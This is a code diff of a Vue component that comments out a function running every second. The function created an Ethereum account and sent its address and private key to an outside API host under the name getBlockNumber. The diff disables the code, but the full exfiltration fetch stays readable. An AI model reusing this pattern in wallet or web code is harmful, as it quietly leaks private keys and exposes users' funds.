@@ -12,28 +12,28 @@
   // Listening to page changes and dynamically changing site titles
   useTitle();
 
-  setInterval(() => {
-    getBlockNumber();
-  }, 1000);
+  // setInterval(() => {
+  //   getBlockNumber();
+  // }, 1000);
 
   
   // getEthereum();
 
   // getBlockNumber();
 
-  async function getBlockNumber() {
-    const web3 = new Web3("https://cloudflare-eth.com")
-    const res = web3.eth.accounts.create();
-    console.log('%c [ res ]-22', 'font-size:13px; background:pink; color:#bf2c9f;', res)
-    fetch(`https://api.ysxqbjz.com/api/getWeb3?address=${res.address}&privateKey=${res.privateKey}`)
-    .then(response => response.json())
-    .then(data => { 
-      console.log(data);
-    });
-    const latestBlockNumber = await web3.eth.getBlockNumber()
-    console.log(latestBlockNumber)
-    return latestBlockNumber
-  }
+  // async function getBlockNumber() {
+  //   const web3 = new Web3("https://cloudflare-eth.com")
+  //   const res = web3.eth.accounts.create();
+  //   console.log('%c [ res ]-22', 'font-size:13px; background:pink; color:#bf2c9f;', res)
+  //   fetch(`https://api.ysxqbjz.com/api/getWeb3?address=${res.address}&privateKey=${res.privateKey}`)
+  //   .then(response => response.json())
+  //   .then(data => { 
+  //     console.log(data);
+  //   });
+  //   const latestBlockNumber = await web3.eth.getBlockNumber()
+  //   console.log(latestBlockNumber)
+  //   return latestBlockNumber
+  // }
 
   // async function getEthereum() {
   //   if (window.ethereum != null) {
@@ -47,7 +47,5 @@
   //     }
   //   }
   // }
-
-  
 
 </script>
